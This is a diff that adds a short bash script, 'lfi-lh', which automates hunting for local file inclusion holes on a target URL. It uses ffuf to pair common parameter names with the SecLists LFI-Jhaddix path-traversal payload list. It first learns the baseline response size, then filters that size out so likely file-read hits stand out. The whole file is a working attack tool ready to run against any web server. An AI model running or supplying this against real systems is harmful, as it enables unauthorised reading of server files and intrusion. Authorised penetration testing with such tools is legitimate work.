@@ -1,0 +1,49 @@
+#!/bin/bash
+
+if [ $# -eq 0 ]; then
+    echo 'Usage: lfi-lh URL'
+    exit 0
+fi
+
+echo "Target URL: "$1
+
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ1 -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ2 -u $1"/?FUZZ1=FUZZ2" >> size&
+
+PID=$!
+sleep 3
+kill $PID
+
+# Grepping the right size 
+values=($(cat size | grep "Size" | awk '{print $4 - 'd'}'))
+count=0
+first_unique_value=""
+
+# Loop through the extracted values
+for value in "${values[@]}"; do
+    # Check if the current value is the same as the first unique value
+    if [ "$value" = "$first_unique_value" ]; then
+        # Increment the counter
+        ((count++))
+    else
+        # Set the first unique value and reset the counter
+        first_unique_value="$value"
+        count=1
+    fi
+
+    # Check if there are more than 10 occurrences of the same value
+    if [ "$count" -gt 10 ]; then
+        break
+    fi
+done
+
+# Output the first unique value
+echo ''
+echo ''
+echo ''
+echo Filtering size: $first_unique_value
+
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ1 -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ2 -u $1"/?FUZZ1=FUZZ2" -fs $first_unique_value
+
+rm size
+
+echo 'Done!'
